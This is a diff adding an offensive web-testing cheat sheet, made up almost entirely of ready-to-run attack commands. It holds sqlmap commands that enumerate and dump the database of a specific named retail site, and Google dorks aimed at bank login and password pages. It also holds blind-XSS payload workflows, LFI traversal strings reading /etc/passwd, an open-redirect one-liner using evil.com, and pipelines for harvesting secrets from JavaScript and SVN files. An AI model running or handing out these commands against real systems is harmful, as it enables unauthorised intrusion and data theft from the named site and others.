@@ -1,0 +1,97 @@
+Advance Information Gathering:
+httpx -l subdomains.txt -o activesubs.txt -threads 200 -status-code -tech-detect
+nmap subdomain.com
+nmap subdomain.com -p 80,443,22
+nmap subdomain.com -sV
+nmap subdomain.com -sS
+nmap subdomain.com -O
+nmap subdomain.com -sU
+nmap subdomain.com --script=vuln
+
+
+Install Manually And GF:
+sudo cp assetfinder gf httpx nuclei puredns subjs dalfox httprobe kxss otxurls subjack waybackurls /usr/local/bin
+sudo cp assetfinder gf httpx nuclei puredns subjs dalfox httprobe kxss otxurls subjack waybackurls /usr/bin
+
+git clone https://github.com/1ndianl33t/Gf-Patterns
+mkdir .gf
+mv ~/Gf-Patterns/*.json ~/.gf
+
+SQLI:
+sqlmap -u https://www.ebfashion.com.bd/index.php?id=8 --dbs
+sqlmap -u https://www.ebfashion.com.bd/index.php?id=8 --D dbName --tables
+sqlmap -u https://www.ebfashion.com.bd/index.php?id=8 --D dbName --T tabName --columns
+sqlmap -u https://www.ebfashion.com.bd/index.php?id=8 --D dbName --T tabName -C colName --dump
+
+BXSS Site: https://bxsshunter.com/
+
+XSS:
+Subfinder -d ourDomain.com
+Subfinder -d ourDomain.com | gau > suburl.txt
+Pip3 install uro
+Cat suburl.txt | uro > urls.txt
+Gf xss urls.txt | dalfox -b “our blind xss webApp”
+
+Blind XSS Tips
+- Create an Account
+- Delete/Deactivate Account
+- If the website asks for feedback, Put your payload.
+
+IDOR EndPoints:
+1.site:.com.gh inurl:”bank” 
+2.site:.com.gh inurl:”login”
+3.site:.com.gh inurl:”login” intext:”Bank”
+4.site:.com.gh inurl:”password”
+5. site:example.com intext:"id=" -inurl:(jsp|php|html|aspx)
+
+https://medium.com/@Az3m/idor-checklist-c66133d0802b
+
+LFI:
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+
+CheckList: https://rahadsec.notion.site/Starting-Bug-hunting-BtoA-784a607b19b242e899b1ccd67657032d
+
+
+Openredirex:
+git clone https://github.com/devanshbatham/OpenRedireX.git
+cd OpenRedireX
+paramspider -d target.com -o urls.txt
+python3 openredirex.py -l output/urls.txt -p payloads.txt --keyword FUZZ
+
+waybackurls target.com | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I|grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
+
+SSRF : https://github.com/jdonsec/AllThingsSSRF
+
+PE:
+Target Site: anytask.com
+Encoder Decoder: https://jwt.one/
+https://jwt.io/
+
+Find sensitive information disclosure:
+gau target -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee urls.txt
+sort -u urls.txt | fff -s 200 -o out/
+
+for i in `gf -list`; do [[ ${i} =~ "_secrets"* ]] && gf ${i}; done
+
+discover database secrets:
+dirsearch.py -u target -e php,html,js,xml -x 500,403
+./svn-extractor.py --url http://url.com --match database.php
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
